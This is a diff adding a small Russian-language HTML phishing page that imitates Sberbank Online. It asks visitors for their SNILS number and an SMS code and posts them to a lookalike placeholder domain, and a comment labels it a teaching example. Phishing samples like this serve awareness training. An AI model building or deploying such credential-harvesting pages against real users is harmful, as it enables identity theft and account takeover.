@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>СберБанк Онлайн — безопасный вход</title>
+</head>
+<body>
+  <h1>СберБанк Онлайн</h1>
+  <p>Ваш банк заботится о безопасности: введите СНИЛС и код из СМС,
+     чтобы восстановить доступ.</p>
+  <!-- Учебный пример: домен имитирует известный бренд, страница просит
+       уязвимые данные. Реальный бренд тут ни при чём. -->
+  <form method="post" action="https://sber-login.secure-verify.example.net/confirm">
+    <label>СНИЛС <input type="text" name="snils"></label><br>
+    <label>Код из СМС <input type="text" name="sms"></label><br>
+    <button type="submit">Продолжить</button>
+  </form>
+</body>
+</html>
